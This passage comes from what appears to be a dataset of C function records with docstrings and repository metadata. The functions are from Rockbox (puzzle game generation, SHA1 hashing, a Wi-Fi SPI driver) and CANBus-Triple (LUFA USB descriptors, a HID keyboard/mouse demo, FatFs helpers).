\"0123456789abcdef\"[tiles[i] & 0xF];\n        solution[w*h+1] = '\\0';\n\n\t*aux = solution;\n    }\n\n    /*\n     * Now shuffle the grid.\n     * FIXME - this simply does a set of random moves to shuffle the pieces,\n     * although we make a token effort to avoid boring cases by avoiding moves\n     * that directly undo the previous one, or that repeat so often as to\n     * turn into fewer moves.\n     *\n     * A better way would be to number all the pieces, generate a placement\n     * for all the numbers as for \"sixteen\", observing parity constraints if\n     * neccessary, and then place the pieces according to their numbering.\n     * BUT - I'm not sure if this will work, since we disallow movement of\n     * the middle row and column.\n     */\n    {\n        int i;\n        int cols = w - 1;\n        int rows = h - 1;\n        int moves = params->movetarget;\n        int prevdir = -1, prevrowcol = -1, nrepeats = 0;\n        if (!moves) moves = cols * rows * 2;\n        for (i = 0; i < moves; /* incremented conditionally */) {\n            /* Choose a direction: 0,1,2,3 = up, right, down, left. */\n            int dir = random_upto(rs, 4);\n            int rowcol;\n            if (dir % 2 == 0) {\n                int col = random_upto(rs, cols);\n                if (col >= cx) col += 1;    /* avoid centre */\n                if (col == prevrowcol) {\n                    if (dir == 2-prevdir)\n                        continue;   /* undoes last move */\n                    else if (dir == prevdir && (nrepeats+1)*2 > h)\n                        continue;   /* makes fewer moves */\n                }\n                slide_col_int(w, h, tiles, 1 - dir, col);\n                rowcol = col;\n            } else {\n                int row = random_upto(rs, rows);\n                if (row >= cy) row += 1;    /* avoid centre */\n                if (row == prevrowcol) {\n                    if (dir == 4-prevdir)\n                        continue;   /* undoes last move */\n                    else if (dir == prevdir && (nrepeats+1)*2 > w)\n                        continue;   /* makes fewer moves */\n                }\n                slide_row_int(w, h, tiles, 2 - dir, row);\n                rowcol = row;\n            }\n            if (dir == prevdir && rowcol == prevrowcol)\n                nrepeats++;\n            else\n                nrepeats = 1;\n            prevdir = dir;\n            prevrowcol = rowcol;\n            i++;    /* if we got here, the move was accepted */\n        }\n    }\n\n    /*\n     * And now choose barrier locations. (We carefully do this\n     * _after_ shuffling, so that changing the barrier rate in the\n     * params while keeping the random seed the same will give the\n     * same shuffled grid and _only_ change the barrier locations.\n     * Also the way we choose barrier locations, by repeatedly\n     * choosing one possibility from the list until we have enough,\n     * is designed to ensure that raising the barrier rate while\n     * keeping the seed the same will provide a superset of the\n     * previous barrier set - i.e. if you ask for 10 barriers, and\n     * then decide that's still too hard and ask for 20, you'll get\n     * the original 10 plus 10 more, rather than getting 20 new\n     * ones and the chance of remembering your first 10.)\n     */\n    nbarriers = (int)(params->barrier_probability * count234(barriertree));\n    assert(nbarriers >= 0 && nbarriers <= count234(barriertree));\n\n    while (nbarriers > 0) {\n\tint i;\n\tstruct xyd *xyd;\n\tint x1, y1, d1, x2, y2, d2;\n\n\t/*\n\t * Extract a randomly chosen barrier from the list.\n\t */\n\ti = random_upto(rs, count234(barriertree));\n\txyd = delpos234(barriertree, i);\n\n\tassert(xyd != NULL);\n\n\tx1 = xyd->x;\n\ty1 = xyd->y;\n\td1 = xyd->direction;\n\tsfree(xyd);\n\n\tOFFSET(x2, y2, x1, y1, d1, params);\n\td2 = F(d1);\n\n\tindex(params, barriers, x1, y1) |= d1;\n\tindex(params, barriers, x2, y2) |= d2;\n\n\tnbarriers--;\n    }\n\n    /*\n     * Clean up the rest of the barrier list.\n     */\n    {\n\tstruct xyd *xyd;\n\n\twhile ( (xyd = delpos234(barriertree, 0)) != NULL)\n\t    sfree(xyd);\n\n\tfreetree234(barriertree);\n    }\n\n    /*\n     * Finally, encode the grid into a string game description.\n     * \n     * My syntax is extremely simple: each square is encoded as a\n     * hex digit in which bit 0 means a connection on the right,\n     * bit 1 means up, bit 2 left and bit 3 down. (i.e. the same\n     * encoding as used internally). Each digit is followed by\n     * optional barrier indicators: `v' means a vertical barrier to\n     * the right of it, and `h' means a horizontal barrier below\n     * it.\n     */\n    desc = snewn(w * h * 3 + 1, char);\n    p = desc;\n    for (y = 0; y < h; y++) {\n        for (x = 0; x < w; x++) {\n            *p++ = \"0123456789abcdef\"[index(params, tiles, x, y)];\n            if ((params->wrapping || x < w-1) &&\n                (index(params, barriers, x, y) & R))\n                *p++ = 'v';\n            if ((params->wrapping || y < h-1) &&\n                (index(params, barriers, x, y) & D))\n                *p++ = 'h';\n        }\n    }\n    assert(p - desc <= w*h*3);\n    *p = '\\0';\n\n    sfree(tiles);\n    sfree(barriers);\n\n    return desc;\n}", "path": "apps\\plugins\\puzzles\\src\\netslide.c", "repo_name": "Rockbox/rockbox", "stars": 395, "license": "None", "language": "c", "size": 222360}
{"docstring": "/* Process LEN bytes of BUFFER, accumulating context into CTX.\n   It is assumed that LEN % 64 == 0.\n   Most of this code comes from GnuPG's cipher/sha1.c.  */\n", "func_signal": "void\nsha1_process_block (const void *buffer, size_t len, struct sha1_ctx *ctx)", "code": "{\n  const uint32_t *words = buffer;\n  size_t nwords = len / sizeof (uint32_t);\n  const uint32_t *endp = words + nwords;\n  uint32_t x[16];\n  uint32_t a = ctx->A;\n  uint32_t b = ctx->B;\n  uint32_t c = ctx->C;\n  uint32_t d = ctx->D;\n  uint32_t e = ctx->E;\n\n  /* First increment the byte count.  RFC 1321 specifies the possible\n     length of the file up to 2^64 bits.  Here we only compute the\n     number of bytes.  Do a double word increment.  */\n  ctx->total[0] += len;\n  if (ctx->total[0] < len)\n    ++ctx->total[1];\n\n#define rol(x, n) (((x) << (n)) | ((uint32_t) (x) >> (32 - (n))))\n\n#define M(I) ( tm =   x[I&0x0f] ^ x[(I-14)&0x0f] \\\n\t\t    ^ x[(I-8)&0x0f] ^ x[(I-3)&0x0f] \\\n\t       , (x[I&0x0f] = rol(tm, 1)) )\n\n#define R(A,B,C,D,E,F,K,M)  do { E += rol( A, 5 )     \\\n\t\t\t\t      + F( B, C, D )  \\\n\t\t\t\t      + K\t      \\\n\t\t\t\t      + M;\t      \\\n\t\t\t\t B = rol( B, 30 );    \\\n\t\t\t       } while(0)\n\n  while (words < endp)\n    {\n      uint32_t tm;\n      int t;\n      for (t = 0; t < 16; t++)\n\t{\n\t  x[t] = SWAP (*words);\n\t  words++;\n\t}\n\n      R( a, b, c, d, e, F1, K1, x[ 0] );\n      R( e, a, b, c, d, F1, K1, x[ 1] );\n      R( d, e, a, b, c, F1, K1, x[ 2] );\n      R( c, d, e, a, b, F1, K1, x[ 3] );\n      R( b, c, d, e, a, F1, K1, x[ 4] );\n      R( a, b, c, d, e, F1, K1, x[ 5] );\n      R( e, a, b, c, d, F1, K1, x[ 6] );\n      R( d, e, a, b, c, F1, K1, x[ 7] );\n      R( c, d, e, a, b, F1, K1, x[ 8] );\n      R( b, c, d, e, a, F1, K1, x[ 9] );\n      R( a, b, c, d, e, F1, K1, x[10] );\n      R( e, a, b, c, d, F1, K1, x[11] );\n      R( d, e, a, b, c, F1, K1, x[12] );\n      R( c, d, e, a, b, F1, K1, x[13] );\n      R( b, c, d, e, a, F1, K1, x[14] );\n      R( a, b, c, d, e, F1, K1, x[15] );\n      R( e, a, b, c, d, F1, K1, M(16) );\n      R( d, e, a, b, c, F1, K1, M(17) );\n      R( c, d, e, a, b, F1, K1, M(18) );\n      R( b, c, d, e, a, F1, K1, M(19) );\n      R( a, b, c, d, e, F2, K2, M(20) );\n      R( e, a, b, c, d, F2, K2, M(21) );\n      R( d, e, a, b, c, F2, K2, M(22) );\n      R( c, d, e, a, b, F2, K2, M(23) );\n      R( b, c, d, e, a, F2, K2, M(24) );\n      R( a, b, c, d, e, F2, K2, M(25) );\n      R( e, a, b, c, d, F2, K2, M(26) );\n      R( d, e, a, b, c, F2, K2, M(27) );\n      R( c, d, e, a, b, F2, K2, M(28) );\n      R( b, c, d, e, a, F2, K2, M(29) );\n      R( a, b, c, d, e, F2, K2, M(30) );\n      R( e, a, b, c, d, F2, K2, M(31) );\n      R( d, e, a, b, c, F2, K2, M(32) );\n      R( c, d, e, a, b, F2, K2, M(33) );\n      R( b, c, d, e, a, F2, K2, M(34) );\n      R( a, b, c, d, e, F2, K2, M(35) );\n      R( e, a, b, c, d, F2, K2, M(36) );\n      R( d, e, a, b, c, F2, K2, M(37) );\n      R( c, d, e, a, b, F2, K2, M(38) );\n      R( b, c, d, e, a, F2, K2, M(39) );\n      R( a, b, c, d, e, F3, K3, M(40) );\n      R( e, a, b, c, d, F3, K3, M(41) );\n      R( d, e, a, b, c, F3, K3, M(42) );\n      R( c, d, e, a, b, F3, K3, M(43) );\n      R( b, c, d, e, a, F3, K3, M(44) );\n      R( a, b, c, d, e, F3, K3, M(45) );\n      R( e, a, b, c, d, F3, K3, M(46) );\n      R( d, e, a, b, c, F3, K3, M(47) );\n      R( c, d, e, a, b, F3, K3, M(48) );\n      R( b, c, d, e, a, F3, K3, M(49) );\n      R( a, b, c, d, e, F3, K3, M(50) );\n      R( e, a, b, c, d, F3, K3, M(51) );\n      R( d, e, a, b, c, F3, K3, M(52) );\n      R( c, d, e, a, b, F3, K3, M(53) );\n      R( b, c, d, e, a, F3, K3, M(54) );\n      R( a, b, c, d, e, F3, K3, M(55) );\n      R( e, a, b, c, d, F3, K3, M(56) );\n      R( d, e, a, b, c, F3, K3, M(57) );\n      R( c, d, e, a, b, F3, K3, M(58) );\n      R( b, c, d, e, a, F3, K3, M(59) );\n      R( a, b, c, d, e, F4, K4, M(60) );\n      R( e, a, b, c, d, F4, K4, M(61) );\n      R( d, e, a, b, c, F4, K4, M(62) );\n      R( c, d, e, a, b, F4, K4, M(63) );\n      R( b, c, d, e, a, F4, K4, M(64) );\n      R( a, b, c, d, e, F4, K4, M(65) );\n      R( e, a, b, c, d, F4, K4, M(66) );\n      R( d, e, a, b, c, F4, K4, M(67) );\n      R( c, d, e, a, b, F4, K4, M(68) );\n      R( b, c, d, e, a, F4, K4, M(69) );\n      R( a, b, c, d, e, F4, K4, M(70) );\n      R( e, a, b, c, d, F4, K4, M(71) );\n      R( d, e, a, b, c, F4, K4, M(72) );\n      R( c, d, e, a, b, F4, K4, M(73) );\n      R( b, c, d, e, a, F4, K4, M(74) );\n      R( a, b, c, d, e, F4, K4, M(75) );\n      R( e, a, b, c, d, F4, K4, M(76) );\n      R( d, e, a, b, c, F4, K4, M(77) );\n      R( c, d, e, a, b, F4, K4, M(78) );\n      R( b, c, d, e, a, F4, K4, M(79) );\n\n      a = ctx->A += a;\n      b = ctx->B += b;\n      c = ctx->C += c;\n      d = ctx->D += d;\n      e = ctx->E += e;\n    }\n}", "path": "tools\\hmac-sha1.c", "repo_name": "Rockbox/rockbox", "stars": 395, "license": "None", "language": "c", "size": 222360}
{"docstring": "/* HAVE_LCD_COLOR */\n", "func_signal": "void pal_write(int i, byte b)", "code": "{\n    if (lcd.pal[i] == b) return;\n    lcd.pal[i] = b;\n#ifdef HAVE_LCD_COLOR\n    updatepalette(i>>1);\n#endif\n}", "path": "apps\\plugins\\rockboy\\lcd.c", "repo_name": "Rockbox/rockbox", "stars": 395, "license": "None", "language": "c", "size": 222360}
{"docstring": "/*\n * SPI Interface Unit Routines\n *\n * The SPU sits between the host and the WLAN module.\n * All communication with the firmware is through SPU transactions.\n *\n * First we have to put a SPU register name on the bus. Then we can\n * either read from or write to that register.\n *\n */\n", "func_signal": "static void spu_transaction_init(struct if_spi_card *card)", "code": "{\n    (void)card;\n    /* Linux delays 400 ns if spu_transaction_finish() was called\n     * within the same jiffy. As we don't have jiffy counter nor\n     * nanosecond delays, simply delay for 1 us. This currently\n     * does not really matter as this driver simply loads firmware.\n     */\n    udelay(1);\n    libertas_spi_cs(0); /* assert CS */\n}", "path": "firmware\\drivers\\libertas\\if_spi.c", "repo_name": "Rockbox/rockbox", "stars": 395, "license": "None", "language": "c", "size": 222360}
{"docstring": "/* Written by Simon Josefsson.  The interface was inspired by memxor\n   in Niels M\u00f6ller's Nettle. */\n", "func_signal": "void *\nmemxor (void * dest, const void * src, size_t n)", "code": "{\n  char const *s = src;\n  char *d = dest;\n\n  for (; n > 0; n--)\n    *d++ ^= *s++;\n\n  return dest;\n}", "path": "tools\\hmac-sha1.c", "repo_name": "Rockbox/rockbox", "stars": 395, "license": "None", "language": "c", "size": 222360}
{"docstring": "/* Process the remaining bytes in the internal buffer and the usual\n   prolog according to the standard and write the result to RESBUF.\n\n   IMPORTANT: On some systems it is required that RESBUF is correctly\n   aligned for a 32-bit value.  */\n", "func_signal": "void *\nsha1_finish_ctx (struct sha1_ctx *ctx, void *resbuf)", "code": "{\n  /* Take yet unprocessed bytes into account.  */\n  uint32_t bytes = ctx->buflen;\n  size_t size = (bytes < 56) ? 64 / 4 : 64 * 2 / 4;\n\n  /* Now count remaining bytes.  */\n  ctx->total[0] += bytes;\n  if (ctx->total[0] < bytes)\n    ++ctx->total[1];\n\n  /* Put the 64-bit file length in *bits* at the end of the buffer.  */\n  ctx->buffer[size - 2] = SWAP ((ctx->total[1] << 3) | (ctx->total[0] >> 29));\n  ctx->buffer[size - 1] = SWAP (ctx->total[0] << 3);\n\n  memcpy (&((char *) ctx->buffer)[bytes], fillbuf, (size - 2) * 4 - bytes);\n\n  /* Process last bytes.  */\n  sha1_process_block (ctx->buffer, size * 4, ctx);\n\n  return sha1_read_ctx (ctx, resbuf);\n}", "path": "tools\\hmac-sha1.c", "repo_name": "Rockbox/rockbox", "stars": 395, "license": "None", "language": "c", "size": 222360}
{"docstring": "/* Put result from CTX in first 20 bytes following RESBUF.  The result\n   must be in little endian byte order.\n\n   IMPORTANT: On some systems it is required that RESBUF is correctly\n   aligned for a 32-bit value.  */\n", "func_signal": "void *\nsha1_read_ctx (const struct sha1_ctx *ctx, void *resbuf)", "code": "{\n  ((uint32_t *) resbuf)[0] = SWAP (ctx->A);\n  ((uint32_t *) resbuf)[1] = SWAP (ctx->B);\n  ((uint32_t *) resbuf)[2] = SWAP (ctx->C);\n  ((uint32_t *) resbuf)[3] = SWAP (ctx->D);\n  ((uint32_t *) resbuf)[4] = SWAP (ctx->E);\n\n  return resbuf;\n}", "path": "tools\\hmac-sha1.c", "repo_name": "Rockbox/rockbox", "stars": 395, "license": "None", "language": "c", "size": 222360}
{"docstring": "/*\n * Keep reading 16 bits from an SPI register until you get the correct result.\n *\n * If mask = 0, the correct result is any non-zero number.\n * If mask != 0, the correct result is any number where\n * number & target_mask == target\n *\n * Returns -ETIMEDOUT if a five seconds passes without the correct result.\n */\n", "func_signal": "static int spu_wait_for_u16(struct if_spi_card *card, uint16_t reg,\n                            uint16_t target_mask, uint16_t target)", "code": "{\n    int err;\n    unsigned long timeout = current_tick + 5*HZ;\n    while (1)\n    {\n        uint16_t val;\n        err = spu_read_u16(card, reg, &val);\n        if (err)\n            return err;\n        if (target_mask)\n        {\n            if ((val & target_mask) == target)\n                return 0;\n        }\n        else\n        {\n            if (val)\n                return 0;\n        }\n        udelay(100);\n        if (TIME_AFTER(current_tick, timeout))\n        {\n            logf(\"%s: timeout with val=%02x, target_mask=%02x, target=%02x\",\n                 __func__, val, target_mask, target);\n            return -ETIMEDOUT;\n        }\n    }\n}", "path": "firmware\\drivers\\libertas\\if_spi.c", "repo_name": "Rockbox/rockbox", "stars": 395, "license": "None", "language": "c", "size": 222360}
{"docstring": "/* Compute SHA1 message digest for LEN bytes beginning at BUFFER.  The\n   result is always in little endian byte order, so that a byte-wise\n   output yields to the wanted ASCII representation of the message\n   digest.  */\n", "func_signal": "void *\nsha1_buffer (const char *buffer, size_t len, void *resblock)", "code": "{\n  struct sha1_ctx ctx;\n\n  /* Initialize the computation context.  */\n  sha1_init_ctx (&ctx);\n\n  /* Process whole buffer but last len % 64 bytes.  */\n  sha1_process_bytes (buffer, len, &ctx);\n\n  /* Put result in desired memory area.  */\n  return sha1_finish_ctx (&ctx, resblock);\n}", "path": "tools\\hmac-sha1.c", "repo_name": "Rockbox/rockbox", "stars": 395, "license": "None", "language": "c", "size": 222360}
{"docstring": "/* Read 16 bits from an SPI register */\n", "func_signal": "static inline int spu_read_u16(struct if_spi_card *card, uint16_t reg, uint16_t *val)", "code": "{\n    uint8_t buf[2];\n    int ret;\n\n    ret = spu_read(card, reg, buf, sizeof(buf));\n    if (ret == 0)\n        *val = buf[0] | (buf[1] << 8);\n\n    return ret;\n}", "path": "firmware\\drivers\\libertas\\if_spi.c", "repo_name": "Rockbox/rockbox", "stars": 395, "license": "None", "language": "c", "size": 222360}
{"docstring": "/*\n * Read 16 bits from an SPI register until you receive a specific value.\n * Returns -ETIMEDOUT if a 4 tries pass without success.\n */\n", "func_signal": "static int spu_wait_for_u32(struct if_spi_card *card, uint32_t reg, uint32_t target)", "code": "{\n    int err, try;\n    for (try = 0; try < 4; ++try)\n    {\n        uint32_t val = 0;\n        err = spu_read_u32(card, reg, &val);\n        if (err)\n            return err;\n        if (val == target)\n            return 0;\n        mdelay(100);\n    }\n    return -ETIMEDOUT;\n}", "path": "firmware\\drivers\\libertas\\if_spi.c", "repo_name": "Rockbox/rockbox", "stars": 395, "license": "None", "language": "c", "size": 222360}
{"docstring": "/* Called to get the recent ADC reading */\n", "func_signal": "inline unsigned short adc_read(int channel)", "code": "{\n    (void)channel;\n    return 0;\n}", "path": "firmware\\target\\arm\\sandisk\\sansa-view\\adc-view.c", "repo_name": "Rockbox/rockbox", "stars": 395, "license": "None", "language": "c", "size": 222360}
{"docstring": "/* ----------------------------------------------------------------------\n * Manage game parameters.\n */\n", "func_signal": "static game_params *default_params(void)", "code": "{\n    game_params *ret = snew(game_params);\n\n    ret->width = 3;\n    ret->height = 3;\n    ret->wrapping = false;\n    ret->barrier_probability = 1.0;\n    ret->movetarget = 0;\n\n    return ret;\n}", "path": "apps\\plugins\\puzzles\\src\\netslide.c", "repo_name": "Rockbox/rockbox", "stars": 395, "license": "None", "language": "c", "size": 222360}
{"docstring": "/* ----------------------------------------------------------------------\n * Process a move.\n */\n", "func_signal": "static void slide_row_int(int w, int h, unsigned char *tiles, int dir, int row)", "code": "{\n    int x = dir > 0 ? -1 : w;\n    int tx = x + dir;\n    int n = w - 1;\n    unsigned char endtile = tiles[row * w + tx];\n    do {\n        x = tx;\n        tx = (x + dir + w) % w;\n        tiles[row * w + x] = tiles[row * w + tx];\n    } while (--n > 0);\n    tiles[row * w + tx] = endtile;\n}", "path": "apps\\plugins\\puzzles\\src\\netslide.c", "repo_name": "Rockbox/rockbox", "stars": 395, "license": "None", "language": "c", "size": 222360}
{"docstring": "/** This function is called by the library when in device mode, and must be overridden (see library \"USB Descriptors\"\n *  documentation) by the application code so that the address and size of a requested descriptor can be given\n *  to the USB library. When the device receives a Get Descriptor request on the control endpoint, this function\n *  is called so that the descriptor details can be passed back and the appropriate descriptor sent back to the\n *  USB host.\n */\n", "func_signal": "uint16_t CALLBACK_USB_GetDescriptor(const uint16_t wValue,\n                                    const uint8_t wIndex,\n                                    const void** const DescriptorAddress)", "code": "{\n\tconst uint8_t  DescriptorType   = (wValue >> 8);\n\tconst uint8_t  DescriptorNumber = (wValue & 0xFF);\n\n\tconst void* Address = NULL;\n\tuint16_t    Size    = NO_DESCRIPTOR;\n\n\tswitch (DescriptorType)\n\t{\n\t\tcase DTYPE_Device:\n\t\t\tAddress = &DeviceDescriptor;\n\t\t\tSize    = sizeof(USB_Descriptor_Device_t);\n\t\t\tbreak;\n\t\tcase DTYPE_Configuration: \n\t\t\tAddress = &ConfigurationDescriptor;\n\t\t\tSize    = sizeof(USB_Descriptor_Configuration_t);\n\t\t\tbreak;\n\t\tcase DTYPE_String: \n\t\t\tif (!(DescriptorNumber))\n\t\t\t{\n\t\t\t\tAddress = &LanguageString;\n\t\t\t\tSize    = LanguageString.Header.Size;\n\t\t\t}\n\t\t\telse\n\t\t\t{\n\t\t\t\tAddress = &ProductString;\n\t\t\t\tSize    = ProductString.Header.Size;\n\t\t\t}\n\t\t\t\n\t\t\tbreak;\n\t}\n\t\n\t*DescriptorAddress = Address;\n\treturn Size;\n}", "path": "avr\\bootloaders\\caterina\\LUFA-111009\\Bootloaders\\DFU\\Descriptors.c", "repo_name": "CANBus-Triple/CANBus-Triple", "stars": 287, "license": "mit", "language": "c", "size": 1952}
{"docstring": "/** Event handler for the USB_ControlRequest event. This is used to catch and process control requests sent to\n *  the device from the USB host before passing along unhandled control requests to the library for processing\n *  internally.\n */\n", "func_signal": "void EVENT_USB_Device_ControlRequest(void)", "code": "{\n\tuint8_t* ReportData;\n\tuint8_t  ReportSize;\n\n\t/* Handle HID Class specific requests */\n\tswitch (USB_ControlRequest.bRequest)\n\t{\n\t\tcase HID_REQ_GetReport:\n\t\t\tif (USB_ControlRequest.bmRequestType == (REQDIR_DEVICETOHOST | REQTYPE_CLASS | REQREC_INTERFACE))\n\t\t\t{\n\t\t\t\tEndpoint_ClearSETUP();\n\n\t\t\t\t/* Determine if it is the mouse or the keyboard data that is being requested */\n\t\t\t\tif (!(USB_ControlRequest.wIndex))\n\t\t\t\t{\n\t\t\t\t\tReportData = (uint8_t*)&KeyboardReportData;\n\t\t\t\t\tReportSize = sizeof(KeyboardReportData);\n\t\t\t\t}\n\t\t\t\telse\n\t\t\t\t{\n\t\t\t\t\tReportData = (uint8_t*)&MouseReportData;\n\t\t\t\t\tReportSize = sizeof(MouseReportData);\n\t\t\t\t}\n\n\t\t\t\t/* Write the report data to the control endpoint */\n\t\t\t\tEndpoint_Write_Control_Stream_LE(ReportData, ReportSize);\n\t\t\t\tEndpoint_ClearOUT();\n\n\t\t\t\t/* Clear the report data afterwards */\n\t\t\t\tmemset(ReportData, 0, ReportSize);\n\t\t\t}\n\n\t\t\tbreak;\n\t\tcase HID_REQ_SetReport:\n\t\t\tif (USB_ControlRequest.bmRequestType == (REQDIR_HOSTTODEVICE | REQTYPE_CLASS | REQREC_INTERFACE))\n\t\t\t{\n\t\t\t\tEndpoint_ClearSETUP();\n\n\t\t\t\t/* Wait until the LED report has been sent by the host */\n\t\t\t\twhile (!(Endpoint_IsOUTReceived()))\n\t\t\t\t{\n\t\t\t\t\tif (USB_DeviceState == DEVICE_STATE_Unattached)\n\t\t\t\t\t  return;\n\t\t\t\t}\n\n\t\t\t\t/* Read in the LED report from the host */\n\t\t\t\tuint8_t LEDStatus = Endpoint_Read_8();\n\n\t\t\t\tEndpoint_ClearOUT();\n\t\t\t\tEndpoint_ClearStatusStage();\n\n\t\t\t\t/* Process the incoming LED report */\n\t\t\t\tKeyboard_ProcessLEDReport(LEDStatus);\n\t\t\t}\n\n\t\t\tbreak;\n\t}\n}", "path": "avr\\bootloaders\\caterina\\LUFA-111009\\Demos\\Device\\LowLevel\\KeyboardMouse\\KeyboardMouse.c", "repo_name": "CANBus-Triple/CANBus-Triple", "stars": 287, "license": "mit", "language": "c", "size": 1952}
{"docstring": "/* Compare memory to memory */\n", "func_signal": "static\nint mem_cmp (const void* dst, const void* src, UINT cnt)", "code": "{\n\tconst BYTE *d = (const BYTE *)dst, *s = (const BYTE *)src;\n\tint r = 0;\n\n\twhile (cnt-- && (r = *d++ - *s++) == 0) ;\n\treturn r;\n}", "path": "avr\\bootloaders\\caterina\\LUFA-111009\\Projects\\TempDataLogger\\Lib\\FATFs\\ff.c", "repo_name": "CANBus-Triple/CANBus-Triple", "stars": 287, "license": "mit", "language": "c", "size": 1952}
{"docstring": "/** Configures the board hardware and chip peripherals for the demo's functionality. */\n", "func_signal": "void SetupHardware(void)", "code": "{\n\t/* Disable watchdog if enabled by bootloader/fuses */\n\tMCUSR &= ~(1 << WDRF);\n\twdt_disable();\n\n\t/* Disable clock division */\n\tclock_prescale_set(clock_div_1);\n\n\t/* Hardware Initialization */\n\tLEDs_Init();\n\tButtons_Init();\n\tADC_Init(ADC_FREE_RUNNING | ADC_PRESCALE_32);\n\tADC_SetupChannel(MIC_IN_ADC_CHANNEL);\n\tUSB_Init();\n\n\t/* Start the ADC conversion in free running mode */\n\tADC_StartReading(ADC_REFERENCE_AVCC | ADC_RIGHT_ADJUSTED | MIC_IN_ADC_MUX_MASK);\n}", "path": "avr\\bootloaders\\caterina\\LUFA-111009\\Demos\\Device\\ClassDriver\\AudioInput\\AudioInput.c", "repo_name": "CANBus-Triple/CANBus-Triple", "stars": 287, "license": "mit", "language": "c", "size": 1952}
{"docstring": "/** This function is called by the library when in device mode, and must be overridden (see library \"USB Descriptors\"\n *  documentation) by the application code so that the address and size of a requested descriptor can be given\n *  to the USB library. When the device receives a Get Descriptor request on the control endpoint, this function\n *  is called so that the descriptor details can be passed back and the appropriate descriptor sent back to the\n *  USB host.\n */\n", "func_signal": "uint16_t CALLBACK_USB_GetDescriptor(const uint16_t wValue,\n                                    const uint8_t wIndex,\n                                    const void** const DescriptorAddress)", "code": "{\n\tconst uint8_t  DescriptorType   = (wValue >> 8);\n\tconst uint8_t  DescriptorNumber = (wValue & 0xFF);\n\n\tconst void* Address = NULL;\n\tuint16_t    Size    = NO_DESCRIPTOR;\n\n\tswitch (DescriptorType)\n\t{\n\t\tcase DTYPE_Device:\n\t\t\tAddress = &DeviceDescriptor;\n\t\t\tSize    = sizeof(USB_Descriptor_Device_t);\n\t\t\tbreak;\n\t\tcase DTYPE_Configuration:\n\t\t\tAddress = &ConfigurationDescriptor;\n\t\t\tSize    = sizeof(USB_Descriptor_Configuration_t);\n\t\t\tbreak;\n\t\tcase DTYPE_String:\n\t\t\tswitch (DescriptorNumber)\n\t\t\t{\n\t\t\t\tcase 0x00:\n\t\t\t\t\tAddress = &LanguageString;\n\t\t\t\t\tSize    = pgm_read_byte(&LanguageString.Header.Size);\n\t\t\t\t\tbreak;\n\t\t\t\tcase 0x01:\n\t\t\t\t\tAddress = &ManufacturerString;\n\t\t\t\t\tSize    = pgm_read_byte(&ManufacturerString.Header.Size);\n\t\t\t\t\tbreak;\n\t\t\t\tcase 0x02:\n\t\t\t\t\tAddress = &ProductString;\n\t\t\t\t\tSize    = pgm_read_byte(&ProductString.Header.Size);\n\t\t\t\t\tbreak;\n\t\t\t}\n\n\t\t\tbreak;\n\t\tcase HID_DTYPE_HID:\n\t\t\tAddress = &ConfigurationDescriptor.HID_GenericHID;\n\t\t\tSize    = sizeof(USB_HID_Descriptor_HID_t);\n\t\t\tbreak;\n\t\tcase HID_DTYPE_Report:\n\t\t\tAddress = &GenericReport;\n\t\t\tSize    = sizeof(GenericReport);\n\t\t\tbreak;\n\t}\n\n\t*DescriptorAddress = Address;\n\treturn Size;\n}", "path": "avr\\bootloaders\\caterina\\LUFA-111009\\Projects\\TempDataLogger\\Descriptors.c", "repo_name": "CANBus-Triple/CANBus-Triple", "stars": 287, "license": "mit", "language": "c", "size": 1952}
{"docstring": "/** Event handler for the library USB Disconnection event. */\n", "func_signal": "void EVENT_USB_Device_Disconnect(void)", "code": "{\n\t/* Stop the sample reload timer */\n\tTCCR0B = 0;\n\n\tLEDs_SetAllLEDs(LEDMASK_USB_NOTREADY);\n}", "path": "avr\\bootloaders\\caterina\\LUFA-111009\\Demos\\Device\\ClassDriver\\AudioInput\\AudioInput.c", "repo_name": "CANBus-Triple/CANBus-Triple", "stars": 287, "license": "mit", "language": "c", "size": 1952}
{"docstring": "/* Check if chr is contained in the string */\n", "func_signal": "static\nint chk_chr (const char* str, int chr)", "code": "{\n\twhile (*str && *str != chr) str++;\n\treturn *str;\n}", "path": "avr\\bootloaders\\caterina\\LUFA-111009\\Projects\\TempDataLogger\\Lib\\FATFs\\ff.c", "repo_name": "CANBus-Triple/CANBus-Triple", "stars": 287, "license": "mit", "language": "c", "size": 1952}
{"docstring": "/** Event handler for the USB_ConfigurationChanged event. This is fired when the host sets the current configuration\n *  of the USB device after enumeration, and configures the keyboard and mouse device endpoints.\n */\n", "func_signal": "void EVENT_USB_Device_ConfigurationChanged(void)", "code": "{\n\tbool ConfigSuccess = true;\n\n\t/* Setup Keyboard HID Report Endpoints */\n\tConfigSuccess &= Endpoint_ConfigureEndpoint(KEYBOARD_IN_EPNUM, EP_TYPE_INTERRUPT, ENDPOINT_DIR_IN,\n\t                                            HID_EPSIZE, ENDPOINT_BANK_SINGLE);\n\tConfigSuccess &= Endpoint_ConfigureEndpoint(KEYBOARD_OUT_EPNUM, EP_TYPE_INTERRUPT, ENDPOINT_DIR_OUT,\n\t                                            HID_EPSIZE, ENDPOINT_BANK_SINGLE);\n\n\t/* Setup Mouse HID Report Endpoint */\n\tConfigSuccess &= Endpoint_ConfigureEndpoint(MOUSE_IN_EPNUM, EP_TYPE_INTERRUPT, ENDPOINT_DIR_IN,\n\t                                            HID_EPSIZE, ENDPOINT_BANK_SINGLE);\n\n\t/* Indicate endpoint configuration success or failure */\n\tLEDs_SetAllLEDs(ConfigSuccess ? LEDMASK_USB_READY : LEDMASK_USB_ERROR);\n}", "path": "avr\\bootloaders\\caterina\\LUFA-111009\\Demos\\Device\\LowLevel\\KeyboardMouse\\KeyboardMouse.c", "repo_name": "CANBus-Triple/CANBus-Triple", "stars": 287, "license": "mit", "language": "c", "size": 1952}
{"docstring": "/** Keyboard task. This generates the next keyboard HID report for the host, and transmits it via the\n *  keyboard IN endpoint when the host is ready for more data. Additionally, it processes host LED status\n *  reports sent to the device via the keyboard OUT reporting endpoint.\n */\n", "func_signal": "void Keyboard_HID_Task(void)", "code": "{\n\tuint8_t JoyStatus_LCL = Joystick_GetStatus();\n\n\t/* Device must be connected and configured for the task to run */\n\tif (USB_DeviceState != DEVICE_STATE_Configured)\n\t  return;\n\n\t/* Check if board button is not pressed, if so mouse mode enabled */\n\tif (!(Buttons_GetStatus() & BUTTONS_BUTTON1))\n\t{\n\t\t/* Make sent key uppercase by indicating that the left shift key is pressed */\n\t\tKeyboardReportData.Modifier = HID_KEYBOARD_MODIFER_LEFTSHIFT;\n\n\t\tif (JoyStatus_LCL & JOY_UP)\n\t\t  KeyboardReportData.KeyCode[0] = HID_KEYBOARD_SC_A;\n\t\telse if (JoyStatus_LCL & JOY_DOWN)\n\t\t  